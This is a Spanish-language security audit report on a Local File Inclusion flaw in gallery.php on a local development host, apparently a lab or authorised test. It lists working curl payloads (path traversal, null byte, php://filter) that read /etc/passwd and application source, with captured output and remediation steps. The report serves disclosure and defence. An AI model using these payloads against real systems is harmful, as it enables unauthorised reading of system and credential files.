# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T08:45:10Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Se detectó una vulnerabilidad de Local File Inclusion (LFI) en gallery.php mediante el parámetro `page`.
- Se confirmó la lectura de ficheros del sistema (por ejemplo `/etc/passwd`).
- Se explotó hasta lectura de ficheros sensibles; se llegó a obtener el contenido de `/etc/passwd` y leer archivos PHP vía php://filter.

Detalles técnicos:
1) Endpoint vulnerable
- URL: http://web.dev.local:8081/gallery.php
- Parámetro: page

2) Comandos y payloads usados (Kali / CLI)
- Reconocimiento básico:
  - curl -I http://web.dev.local:8081/
  - curl -s 'http://web.dev.local:8081/gallery.php?page=modern'

- Traversal directo (Prueba rápida):
  - curl -s 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'

- Null byte attempt (legacy):
  - curl -s 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd%00'

- php://filter to base64-encode files (bypass and read binary/php files):
  - curl -s 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd'
  - curl -s 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php'

3) Pruebas y resultados
- El traversal directo devolvió el contenido de /etc/passwd incrustado en la página.
- El payload con php://filter también devolvió una cadena base64; al decodificarla se obtuvo el contenido de /etc/passwd y el código fuente de gallery.php.

4) Impacto
- Divulgación de información sensible del sistema (usuarios) y del código fuente de la aplicación.
- Potencial escalada: con acceso al código fuente y posibles config/backups se podría extraer credenciales, clave SSH y/o intentar RCE mediante técnicas adicionales (log poisoning, file upload, etc.).

5) Recomendaciones
- Evitar inclusion directa de archivos desde parámetros sin sanitización.
- Normalizar y validar el parámetro `page` frente a una lista blanca de páginas permitidas.
- Deshabilitar wrappers peligrosos o filtrar `php://` en entradas.
- Configurar open_basedir, disable_functions si procede, y usar least privilege para el usuario web.

Anexos — respuestas capturadas (resumen):
- /etc/passwd parcial extraído:
  root:x:0:0:root:/root:/bin/bash
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  ...

- Fragmento base64 decodificado de gallery.php (arranque):
  <?php
  $page = $_GET['page'] ?? 'modern';
  ?>
  <!DOCTYPE html>
  <html lang="es">...


-- Fin del informe
